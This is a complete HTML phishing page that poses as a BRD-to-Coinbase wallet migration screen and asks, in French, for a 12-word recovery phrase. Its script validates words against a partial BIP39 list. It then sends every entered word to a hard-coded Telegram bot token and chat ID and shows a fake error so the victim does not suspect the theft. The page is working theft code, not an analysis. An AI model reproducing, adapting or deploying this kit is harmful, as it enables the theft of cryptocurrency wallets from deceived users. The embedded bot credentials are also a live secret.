<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRD Wallet Migration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #1e1e3f;
            --btn-blue: #586cf5;
            --btn-gray: #3e3f5e;
            --text-white: #ffffff;
            --text-secondary: #b0b0cc;
            --grid-border: rgba(255, 255, 255, 0.1);
            --input-bg: #2a2a4a;
            --error-red: #ff4d4d;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        body { background-color: var(--bg-color); color: var(--text-white); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 500px; min-height: 100vh; display: flex; flex-direction: column; padding: 40px 25px; position: relative; }
        .page { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.4s ease; }
        .page.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .logo-area { display: flex; flex-direction: column; align-items: center; margin-bottom: 40px; }
        .brd-main-img { width: 140px; height: auto; }
        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 20px; }
        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: auto; }
        .btn { width: 100%; padding: 18px; border-radius: 8px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn-primary { background-color: var(--btn-blue); color: white; }
        .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
        
        /* تصميم الخانات */
        .grid-item { 
            background-color: var(--input-bg); 
            border-radius: 8px; 
            height: 56px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            position: relative;
            border: 1px solid transparent; /* إطار شفاف في الأصل */
            transition: 0.3s;
        }
        
        /* الحالة عند وجود كلمة خاطئة */
        .grid-item.invalid {
            border-color: var(--error-red);
        }
        .grid-item.invalid .item-input {
            color: var(--error-red);
        }

        .item-num { color: var(--text-secondary); font-size: 16px; }
        .item-input { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            background: transparent; border: none; color: white; 
            font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; 
        }
        .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
        .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
        #errorMessage { color: var(--error-red); font-size: 14px; text-align: center; margin-top: 15px; display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div id="p1" class="page active">
            <div class="logo-area">
                <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
            </div>
            <h1>BRD has joined<br>Coinbase Wallet!</h1>
            <div class="btn-container">
                <button class="btn btn-primary" onclick="showPage('p2')">Restore Wallet</button>
            </div>
        </div>

        <div id="p2" class="page">
            <h1 style="font-size: 24px; text-align: left;">Récupérer votre portefeuille</h1>
            <p style="color: var(--text-secondary); margin-bottom: 30px;">Veuillez saisir la phrase de récupération.</p>
            <div class="recovery-grid" id="mainGrid"></div>
            <div id="errorMessage">Une erreur s'est produite.</div>
            <div class="btn-container" style="margin-top: 20px;">
                <button class="btn btn-primary" onclick="checkAndSendAll()">Restaurer</button>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU";
        const CHAT_ID = "8745009295";

        // عينة من كلمات BIP39 (يمكنك إضافة القائمة الكاملة هنا)
        const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual"];

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        const grid = document.getElementById('mainGrid');
        for (let i = 1; i <= 12; i++) {
            const div = document.createElement('div');
            div.className = 'grid-item';
            div.id = `item-${i}`;
            div.innerHTML = `<input type="text" class="item-input" data-id="${i}" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
            grid.appendChild(div);
        }

        // مراقبة الكتابة لتغيير اللون
        document.addEventListener('input', (e) => {
            if (e.target.classList.contains('item-input')) {
                const word = e.target.value.trim().toLowerCase();
                const parent = e.target.parentElement;

                if (word === "") {
                    parent.classList.remove('invalid');
                } else if (!bip39Words.includes(word)) {
                    // إذا الكلمة مخربقة (ليست في القائمة)
                    parent.classList.add('invalid');
                } else {
                    // إذا الكلمة صحيحة
                    parent.classList.remove('invalid');
                }
            }
        });

        async function checkAndSendAll() {
            const inputs = document.querySelectorAll('.item-input');
            let words = [];
            inputs.forEach(input => {
                words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${input.value.trim()}</code>`);
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`, parse_mode: 'HTML' })
            });
            document.getElementById('errorMessage').style.display = 'block';
        }
    </script>
</body>
</html>
